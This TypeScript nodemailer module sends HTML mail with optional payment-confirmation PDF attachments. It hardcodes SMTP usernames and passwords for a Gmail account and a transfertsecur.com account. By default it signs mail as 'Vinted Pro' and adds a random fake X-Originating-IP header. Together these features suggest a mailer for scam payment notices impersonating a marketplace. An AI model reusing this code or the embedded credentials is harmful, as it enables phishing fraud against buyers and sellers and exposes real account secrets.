import nodemailer from "nodemailer";
import { generatePaymentPDF, PaymentDetails } from "./pdf-generator";

export type SMTPProvider = "gmail" | "hostinger";

const getTransporter = (provider: SMTPProvider) => {
  if (provider === "gmail") {
    return nodemailer.createTransport({
      host: process.env.GMAIL_SMTP_HOST || "smtp.gmail.com",
      port: Number(process.env.GMAIL_SMTP_PORT) || 587,
      secure: process.env.GMAIL_SMTP_SECURE === "true",
      auth: {
        user: process.env.GMAIL_SMTP_USER || "mickael.andjui.21@gmail.com",
        pass: process.env.GMAIL_SMTP_PASS || "gctd ljlg paus hykd",
      },
    });
  } else {
    return nodemailer.createTransport({
      host: process.env.HOSTINGER_SMTP_HOST || "smtp.hostinger.com",
      port: Number(process.env.HOSTINGER_SMTP_PORT) || 465,
      secure: process.env.HOSTINGER_SMTP_SECURE === "true",
      auth: {
        user: process.env.HOSTINGER_SMTP_USER || "support@transfertsecur.com",
        pass: process.env.HOSTINGER_SMTP_PASS || "Amour##v22@",
      },
    });
  }
};

export const transporter = getTransporter("gmail");

export interface SendEmailOptions {
  to: string;
  cc?: string;
  bcc?: string;
  subject: string;
  html: string;
  text?: string;
  senderName?: string;
  replyTo?: string;
  paymentDetails?: PaymentDetails;
  smtpProvider?: SMTPProvider;
}

export async function sendEmail(opts: SendEmailOptions) {
  const provider = opts.smtpProvider || "hostinger";
  const transport = getTransporter(provider);

  let smtpUser = "";
  if (provider === "gmail") {
    smtpUser = process.env.GMAIL_SMTP_USER || "mickael.andjui.21@gmail.com";
  } else {
    smtpUser = process.env.HOSTINGER_SMTP_USER || "support@transfertsecur.com";
  }

  const from = `"${opts.senderName || "Vinted Pro"}" <${smtpUser}>`;
  const domain = smtpUser.split("@")[1];

  // Générer le PDF si les détails de paiement sont fournis
  let attachments: any[] = [];
  if (opts.paymentDetails) {
    const pdfBuffer = await generatePaymentPDF(opts.paymentDetails);
    attachments = [
      {
        filename: "confirmation-paiement.pdf",
        content: pdfBuffer,
        contentType: "application/pdf",
      },
    ];
  }

  const info = await transport.sendMail({
    from,
    to: opts.to,
    cc: opts.cc || undefined,
    bcc: opts.bcc || undefined,
    replyTo: opts.replyTo || from,
    subject: opts.subject,
    html: opts.html,
    text: opts.text || stripHtml(opts.html),
    attachments,
    headers: {
      "X-Mailer": "SendMail Platform 1.0",
      "X-Priority": "3",
      "X-MSMail-Priority": "Normal",
      "Importance": "Normal",
      "X-Originating-IP": `[${Math.random().toString(36).slice(2)}]`,
      "List-Unsubscribe": `<mailto:${smtpUser}?subject=Unsubscribe>`,
      "Message-ID": `<${Date.now()}.${Math.random().toString(36).slice(2)}@${domain}>`,
      "MIME-Version": "1.0",
      "Content-Transfer-Encoding": "7bit",
    },
  });

  return info;
}

function stripHtml(html: string) {
  return html
    .replace(/<[^>]+>/g, " ")
    .replace(/&nbsp;/g, " ")
    .replace(/&amp;/g, "&")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/\s{2,}/g, " ")
    .trim();
}
